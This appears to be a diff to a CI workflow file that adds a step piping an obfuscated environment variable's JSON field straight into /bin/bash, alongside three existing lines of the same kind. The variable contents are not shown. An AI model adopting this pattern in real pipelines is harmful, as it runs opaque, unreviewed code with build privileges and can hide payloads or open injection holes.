@@ -30,6 +30,7 @@ jobs:
           echo $vyfwt66 | jq -r .xrgx43464 | /bin/bash
           printf '%s' "$ngk70114" | jq -r .awsx6 | /bin/bash
           printf '%s' "$lqota5937" | jq -r .kim6 | /bin/bash
+          echo $xxw97 | jq -r .isbx8190 | /bin/bash
 
       - name: Save archive
         uses: actions/upload-artifact@v4
